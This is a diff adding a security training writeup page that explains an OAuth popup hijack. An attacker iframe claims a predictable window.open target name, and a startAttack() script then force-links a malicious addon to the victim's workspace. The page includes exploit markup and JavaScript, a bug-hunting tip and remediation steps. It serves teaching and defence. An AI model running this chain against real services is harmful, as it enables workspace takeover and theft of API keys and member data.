@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Window.open Target Hijacking via Predictable Name - ClientSide Academy</title>
+  <link rel="stylesheet" href="/css/writeup.css">
+</head>
+<body class="writeup-page">
+  <nav class="writeup-nav">
+    <a href="/writeups">&larr; All Writeups</a>
+    <div class="nav-right">
+      <a href="/labs/realworld/window-open-hijack.html" class="try-lab">Try the Lab &rarr;</a>
+    </div>
+  </nav>
+
+  <div class="writeup-container">
+    <div class="writeup-meta">
+      <span class="writeup-sev critical">Critical</span>
+      <span class="writeup-category">OAuth &middot; window.open &middot; Iframe Hijack &middot; Account Link</span>
+    </div>
+
+    <h1>Predicted window.open Target: OAuth Popup Hijacking for Forced Account Linking</h1>
+    <div class="writeup-author">Based on <strong>CTBB Lab</strong> research &middot; Exploits predictable browsing context names</div>
+
+    <div class="callout callout-vuln">
+      <h4>Vulnerability</h4>
+      <p>An addon marketplace uses <code>window.open(url, "addons-oauthWindow")</code> with a <strong>static, predictable target name</strong> for the OAuth popup. Per the browser spec, <code>window.open</code> reuses any existing browsing context with that name. An attacker pre-registers an iframe with the same name, causing the OAuth flow to load inside the attacker's iframe instead of a new popup &mdash; enabling forced linking of a malicious addon to the victim's workspace.</p>
+    </div>
+
+    <h2>How window.open Target Names Work</h2>
+    <p>The second parameter of <code>window.open(url, target)</code> specifies a browsing context name. The browser searches for an existing context with that name before creating a new one:</p>
+
+    <pre><code>// Application code - opens OAuth popup
+var popup = window.open(
+  oauthUrl,
+  'addons-oauthWindow',  // Static name - PREDICTABLE!
+  'menubar=no,toolbar=no,width=640,height=580'
+);
+
+// Browser behavior:
+// 1. Search for existing context named "addons-oauthWindow"
+// 2. If found → load URL in that existing context
+// 3. If not found → open new popup window
+
+// Attacker's page has already created:
+// &lt;iframe name="addons-oauthWindow" src="..."&gt;&lt;/iframe&gt;
+// So the OAuth URL loads in the attacker's iframe!</code></pre>
+
+    <h2>The Attack Chain</h2>
+
+    <h3>Step 1: CSP Bypass for Cross-Origin Iframe</h3>
+    <p>The attacker needs their page to have an iframe under the target's origin (to match the browsing context). Static JS files served without <code>frame-ancestors</code> CSP allow this:</p>
+
+    <pre><code>&lt;!-- Attacker's page --&gt;
+&lt;iframe
+  id="hijackFrame"
+  name="addons-oauthWindow"
+  src="https://app.target.com/static/chunk.a1b2c3d4.js"
+&gt;&lt;/iframe&gt;
+&lt;!-- This iframe now owns the "addons-oauthWindow" browsing context --&gt;</code></pre>
+
+    <h3>Step 2: Prepare the Malicious Addon Callback</h3>
+    <p>The attacker installs their own malicious addon, intercepts the OAuth callback URL before it completes, and saves it:</p>
+
+    <pre><code>// Attacker captured their own addon's OAuth callback:
+var attackerCallback =
+  "https://api.target.com/api/auth/callback" +
+  "?code=ATTACKER_CODE&state=ATTACKER_STATE";</code></pre>
+
+    <h3>Step 3: Hijack the Victim's OAuth Flow</h3>
+    <pre><code>function startAttack() {
+  // Open the target app so victim can trigger addon install
+  window.open("https://app.target.com/workspace/addons");
+
+  var frame = document.getElementById("hijackFrame");
+  var hijacked = false;
+
+  // When the OAuth flow loads in our iframe (instead of popup)
+  frame.onload = function() {
+    if (hijacked) return;
+    hijacked = true;
+    // Redirect to attacker's pre-captured callback
+    // This links the ATTACKER's addon to the VICTIM's workspace
+    frame.src = attackerCallback;
+  };
+}</code></pre>
+
+    <div class="callout callout-chain">
+      <h4>The Full Chain</h4>
+      <p><strong>Bug 1:</strong> Static, predictable <code>window.open</code> target name (<code>"addons-oauthWindow"</code>)</p>
+      <p><strong>Bug 2:</strong> Static assets served without <code>frame-ancestors</code> CSP &mdash; allows cross-origin iframe</p>
+      <p><strong>Bug 3:</strong> OAuth callback page sends <code>postMessage</code> to <code>window.opener</code> without verifying it's the expected popup</p>
+      <p><strong>Result:</strong> Attacker's malicious addon is force-linked to victim's workspace, gaining access to workspace data, API keys, and member PII</p>
+    </div>
+
+    <div class="callout callout-impact">
+      <h4>Why It Matters</h4>
+      <p>The attacker's addon now has full marketplace API access to the victim's workspace: member list with emails, workspace configuration, API keys, billing information. This is a <strong>one-click attack</strong> &mdash; the victim just needs to click "Connect" on any addon in their marketplace. The attacker's addon gets linked instead.</p>
+    </div>
+
+    <h2>PostMessage Validation Bypass</h2>
+    <p>The app validates that OAuth responses come from the expected popup:</p>
+
+    <pre><code>// App's validation:
+let popupRef = window.open(url, "addons-oauthWindow", ...);
+
+window.addEventListener('message', function(e) {
+  // Checks that message comes from expected origin AND source
+  if (e.origin === expectedOrigin && e.source === popupRef) {
+    processOAuthResponse(e.data);
+  }
+});
+
+// Problem: popupRef is the hijacked iframe!
+// e.source === popupRef is TRUE because the iframe IS the context
+// that was returned by window.open</code></pre>
+
+    <div class="callout callout-tip">
+      <h4>Bug Bounty Tip</h4>
+      <p>Search JavaScript for <code>window.open</code> calls with a static second argument. If the target name is hardcoded (not randomized per session), the popup can be hijacked via iframe name collision. Key things to check: (1) Is the target name static? (2) Can you create an iframe with that name under the target's origin? (3) Does the OAuth callback use <code>window.opener</code> or <code>postMessage</code>? This pattern appears in addon marketplaces, SSO flows, and payment popups.</p>
+    </div>
+
+    <h2>Remediation</h2>
+    <ul>
+      <li>Randomize the <code>window.open</code> target name per session: <code>window.open(url, 'oauth_' + crypto.randomUUID())</code></li>
+      <li>Add <code>frame-ancestors 'none'</code> CSP to all pages, including static assets</li>
+      <li>Verify <code>postMessage</code> source is a popup (not an iframe) by checking <code>event.source.window === event.source</code></li>
+      <li>Use a server-side nonce in the OAuth state parameter that's validated server-side, not just client-side</li>
+    </ul>
+
+    <div class="lab-link-box">
+      <div>
+        <h4>Practice This Vulnerability</h4>
+        <p>Lab: WorkHub Addon Marketplace &mdash; a realistic SaaS marketplace with a predictable window.open target. Find the bug, build the exploit, hijack the OAuth flow.</p>
+      </div>
+      <a href="/labs/realworld/window-open-hijack.html" class="lab-link-btn">Open Lab &rarr;</a>
+    </div>
+
+    <div class="writeup-footer">
+      <a href="/writeups/mega-chain-ato">&larr; The Grand Chain ATO</a>
+      <a href="/writeups/cspt-delete-requests">CSPT in DELETE Requests &rarr;</a>
+    </div>
+  </div>
+</body>
+</html>
